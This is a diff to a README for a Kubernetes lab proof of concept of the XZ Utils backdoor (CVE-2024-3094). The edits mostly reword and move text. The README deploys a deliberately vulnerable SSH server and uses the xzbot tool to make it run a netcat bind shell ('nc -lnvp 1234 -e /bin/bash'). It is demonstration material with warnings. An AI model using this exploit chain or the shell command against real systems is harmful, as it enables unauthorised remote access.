@@ -7,7 +7,7 @@
 
 ```
 
-This project is a Kubernetes friendly Proof of Concept (POC) for [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) affecting XZ Utils. See [this article](https://pentest-tools.com/blog/xz-utils-backdoor-cve-2024-3094) for an excellent walkthrough of the exploit's provenance and mechanics.
+This project is a Kubernetes-friendly Proof of Concept (POC) for [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) affecting XZ Utils. See [this article](https://pentest-tools.com/blog/xz-utils-backdoor-cve-2024-3094) for an excellent walkthrough of the exploit's provenance and mechanics.
 
 # WARNING 
 ⚠⚠⚠
@@ -25,6 +25,9 @@ Running any of the commands below may result in the deployment of a vulnerable a
 kubectl create -f xzwhy.yml
 ```
 
+This will deploy a vulnerable SSH endpoint whose entrypoint is ```/bin/bash -c "env -i LANG=en_US.UTF-8 && unset TERM && unset LD_DEBUG && LD_LIBRARY_PATH=/CVE-2024-3094/ /usr/sbin/sshd -p 2222 -D"```
+
+
 ### 2: Obtain the vulnerable endpoint's URL
 The vulnerable SSH endpoint exposes two ports via a load balancer: 2222 is listening for SSH connections and 1234 is a convenience to allow ingress on a bind shell port that we will use during the exploit
 ```
@@ -40,6 +43,7 @@ The vulnerable SSH endpoint exposes two ports via a load balancer: 2222 is liste
       targetPort: 1234
 ```
 
+
 We can extract the deployed loadbalancer's URL using kubectl:
 ```
 xzwhy_endpoint=`kubectl get services -o jsonpath='{.items[0].status.loadBalancer.ingress[0].hostname}' --namespace=xzwhy-ns --field-selector metadata.name=xzwhy-loadbalancer` && echo $xzwhy_endpoint
@@ -51,8 +55,6 @@ Now we connect to the vulnerable server using the [teamnautilus/xzbot](https://h
 ```
 docker run -it --rm golang:latest /bin/bash -c "mkdir -p /xzbot && pushd /xzbot/ && git clone https://github.com/amlweems/xzbot.git && ls -laF && pushd ./xzbot/ && go build -o /xzbot/tmp/; popd && /xzbot/tmp/xzbot -h && /xzbot/tmp/xzbot -addr $xzwhy_endpoint:2222 -cmd 'nc -lnvp 1234 -e /bin/bash'"
 ```
-
-The entrypoint of this container is ```entrypoint: /bin/bash -c "env -i LANG=en_US.UTF-8 && unset TERM && unset LD_DEBUG && LD_LIBRARY_PATH=/CVE-2024-3094/ /usr/sbin/sshd -p 2222 -D"```
 
 This will cause the vulnerable SSH server to execute a bind shell via ```nc -lnvp 1234 -e /bin/bash``` on our behalf. After running this command you should see something similar to:
 ```
